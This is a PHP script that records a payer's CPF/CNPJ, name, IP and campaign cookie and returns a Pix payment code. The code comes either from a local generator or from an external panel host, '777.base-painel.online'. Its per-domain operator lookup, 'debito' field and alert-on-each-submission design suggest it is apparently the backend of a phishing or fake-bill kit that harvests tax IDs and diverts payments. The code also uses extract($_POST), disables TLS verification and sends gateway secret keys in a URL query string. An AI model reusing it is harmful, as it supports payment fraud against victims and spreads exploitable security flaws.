<?php

error_reporting(0);

date_default_timezone_set('America/Sao_Paulo');

if($_POST){

extract($_POST);

    include_once "../db.php";

    $cpf_cnpj = trim((string) ($_POST['cpf_cnpj'] ?? ''));
    $nome = trim((string) ($_POST['nome'] ?? ''));
    $debito = trim((string) ($_POST['debito'] ?? 'faura'));
    $valor_pago = $_POST['valor'] ?? null;
    $ip = trim((string) ($_COOKIE['ip'] ?? null));
    $pais = trim((string) ($_COOKIE['pais'] ?? null));
    $identity = trim($_COOKIE['Identity'] ?? null);
    $status = trim((string) ($_POST['status'] ?? 'pendente'));
    $id_usuario = trim($_COOKIE['campanha'] ?? null);

    if(!$id_usuario || !$identity){

        $dominioAtual = $_SERVER['HTTP_HOST'] ?? '';

        $stmt = $pdo->prepare("SELECT diretorio_raiz, id_usuario, page FROM dominios WHERE nome_dominio = :dominio AND status = 'ativo' LIMIT 1");
        $stmt->execute(['dominio' => $dominioAtual]);
        $dominio = $stmt->fetch();

        $id_usuario = $dominio['id_usuario'];

        $stmt = $pdo->prepare("SELECT username FROM users WHERE id = :id_usuario LIMIT 1");
        $stmt->execute(['id_usuario' => $id_usuario]);
        $user = $stmt->fetch();

        $identity =  $user['username'];
    }

    function gerarPix($chave, $nome, $cidade, $valor) {
        $nome = strtoupper($nome);
        $cidade = strtoupper($cidade);

        function campo($id, $valor) {
            $tamanho = str_pad(strlen($valor), 2, "0", STR_PAD_LEFT);
            return $id . $tamanho . $valor;
        }

        $payload  = campo("00", "01"); // Payload Format
        $payload .= campo("26",
            campo("00", "BR.GOV.BCB.PIX") .
            campo("01", $chave)
        );
        $payload .= campo("52", "0000");
        $payload .= campo("53", "986"); // BRL
        $payload .= campo("54", number_format($valor, 2, '.', ''));
        $payload .= campo("58", "BR");
        $payload .= campo("59", substr($nome, 0, 25));
        $payload .= campo("60", substr($cidade, 0, 15));
        $payload .= campo("62",
            campo("05", "***")
        );

        $payload .= "6304";

        // CRC16
        $payload .= strtoupper(dechex(crc16($payload)));

        return $payload;
    }

    function crc16($str) {
        $polinomio = 0x1021;
        $resultado = 0xFFFF;

        for ($i = 0; $i < strlen($str); $i++) {
            $resultado ^= (ord($str[$i]) << 8);
            for ($j = 0; $j < 8; $j++) {
                if (($resultado <<= 1) & 0x10000) {
                    $resultado ^= $polinomio;
                }
                $resultado &= 0xFFFF;
            }
        }

        return $resultado;
    }

    function limparTexto($texto, $max) {
        // Remove acentos
        $texto = iconv('UTF-8', 'ASCII//TRANSLIT', $texto);

        // Remove caracteres inválidos (mantém letras, números e espaço)
        $texto = preg_replace('/[^A-Za-z0-9 ]/', '', $texto);

        // Converte para maiúsculo
        $texto = strtoupper($texto);

        // Limita tamanho
        return substr($texto, 0, $max);
    }

     function Garado($cpf_cnpj, $nome, $debito, $valor_pago, $ip, $pais, $identity, $status, $id_usuario, $page, $pixCopiarEcole, $ref=false, $chavePix) {
        
        global $pdo;

        $sql = "INSERT INTO table_data (cpf_cnpj, nome, debito, valor_pago, ip, pais, identity, hora, status, id_usuario, ref, page, cod, ch) VALUES (:cpf_cnpj, :nome, :debito, :valor_pago, :ip, :pais, :identity, :hora, :status, :id_usuario, :ref, :page, :cod, :ch)";

        $insertStmt = $pdo->prepare($sql);

        $horaInsert = date('Y-m-d H:i:s');

        $insertStmt->execute([
            ':cpf_cnpj' => $cpf_cnpj,
            ':nome' => $nome,
            ':debito' => $debito,
            ':valor_pago' => $valor_pago,
            ':ip' => $ip,
            ':pais' => $pais,
            ':identity' => $identity,
            ':hora' => $horaInsert,
            ':status' => $status,
            ':id_usuario' => $id_usuario,
            ':ref' => $ref,
            ':page' => $page,
            ':cod' => $pixCopiarEcole,
            ':ch' => $chavePix
        ]);

        $updateStmt = $pdo->prepare("UPDATE notifications SET audio = :audio,  atual = :atual, hora = :hora WHERE id = :id");
        $updateStmt->execute([
            ':audio' => 3,
            ':atual' => rand(100000000, 99999999999),
            ':hora' => $horaInsert,
            ':id' => 1
        ]);
    }

    if($valor){ 

        // Dados do Pix========================================

            $dominioAtual = $_SERVER['HTTP_HOST'] ?? '';

            $stmt = $pdo->prepare("SELECT id_usuario, page FROM dominios WHERE nome_dominio = :dominio AND status = 'ativo' LIMIT 1");
            $stmt->execute(['dominio' => $dominioAtual]);
            $dominio = $stmt->fetch();

            if($dominio){ 

            $id_usuario = $referencia ?? $dominio['id_usuario'];
            $page = $dominio['page'];

            $stmt = $pdo->prepare("SELECT * FROM configuracoes WHERE id_usuario = :id_usuario LIMIT 1");
            $stmt->execute(['id_usuario' => $id_usuario]);
            $configuracoes = $stmt->fetch();

                $client_secret = $configuracoes['secret_key'];
                $client_key = $configuracoes['public_key'];
                $Plataforma = $configuracoes['Plataforma'];

                $nomePix = str_replace(' ','%20',trim($configuracoes['nome']));
                $cidadePix = str_replace(' ','%20',trim(trim($configuracoes['cidade'])));
                $chavePix = str_replace(' ','%20',trim($configuracoes['chave']));
                    
                $txid = rand(1, 99999999999999);

                $valor = trim($valor);

                if($client_key && $client_secret && $Plataforma!='chavepix'){ 

                   $out = $_POST['out'] ?? ''; 
                 
                    $ResultadoPG = number_format($valor, 2, ',', '.');
                    $ResultadoPGX = str_replace(',', '', str_replace('.', '', $ResultadoPG));
            
                    if($_COOKIE["pixCopiarEcole$ResultadoPGX$out"]){
            
                        sleep(1);

                        $pixCopiarEcole = $_COOKIE["pixCopiarEcole$ResultadoPGX$out"];
                
                        echo json_encode(array('status'=>true, 'pix'=>$pixCopiarEcole, 'mensagem'=>'chave em historico'));

                        return;

                    }else{

                        $currentUrl = "https://777.base-painel.online";

                        if($client_key && $client_secret){ 

                            $pix = file_get_contents("$currentUrl/api/gate.php?valor=$valor&secretKey=$client_secret&Publica=$client_key&gate=$Plataforma");
        
                            $pixCopiarEcoleData = json_decode($pix);
        
                                $pixCopiarEcole = $pixCopiarEcoleData->qrcode;

                                if($pixCopiarEcole){

                                    $ref = $pixCopiarEcoleData->id;

                                    echo json_encode(array('status'=>true, 'pix'=>$pixCopiarEcole, 'id'=>$ref));
                                
                                    setcookie('pixCopiarEcole'.$ResultadoPGX.$out, $pixCopiarEcole, time() + (60 * 20));

                                    Garado($cpf_cnpj, $nome, $debito, $valor_pago, $ip, $pais, $identity, $status, $id_usuario, $page, $pixCopiarEcole, $ref, $client_secret);

                                }else{
                                    echo json_encode(array('status'=>false, 'pix'=>false, 'resposta'=>$pix));
                                }
        
                            exit();
                        }
                    }
            
                }else{

                    $ch = curl_init();
                    curl_setopt($ch, CURLOPT_URL, "https://gerarqrcodepix.com.br/api/v1?nome=$nomePix&cidade=$cidadePix&chave=$chavePix&valor=$valor&txid=$txid&mcc=7222&saida=br");
                    curl_setopt($ch, CURLOPT_LOW_SPEED_LIMIT, 0);
                    curl_setopt($ch, CURLOPT_HEADER, 0);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                
                    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                
                        'authority: gerarqrcodepix.com.br',
                        'sec-ch-ua: "Opera";v="77", "Chromium";v="91", ";Not A Brand";v="99"',
                        'accept: */*',
                        'Accept: application/json'
                    
                    ));
                    curl_setopt($ch, CURLOPT_COOKIEJAR, dirname(__FILE__) . '/cookie.txt');
                    curl_setopt($ch, CURLOPT_COOKIEFILE, dirname(__FILE__) . '/cookie.txt');
                    curl_setopt($ch, CURLOPT_COOKIE, dirname(__FILE__) . '/cookie.txt');
                    curl_setopt($ch, CURLOPT_COOKIESESSION, dirname(__FILE__) . '/cookie.txt');
                
                   // $pix = curl_exec($ch);

                   // $pixCopiarEcole = json_decode($pix)->brcode;

                   $pixCopiarEcole = gerarPix($chavePix, limparTexto($nomePix, 20), limparTexto($cidadePix, 20), $valor);

                    if($pixCopiarEcole){
                    
                        echo json_encode(array('status'=>true, 'pix'=>$pixCopiarEcole));
                    
                        Garado($cpf_cnpj, $nome, $debito, $valor_pago, $ip, $pais, $identity, $status, $id_usuario, $page, $pixCopiarEcole, false, $chavePix);
                       
                    }else{

                        echo json_encode(array('status'=>false, 'pix'=>false));
                    }
                }
            }

            //=====================================================
        }

    }else{
        header("HTTP/1.0 500 Internal Server Error");
    }

?>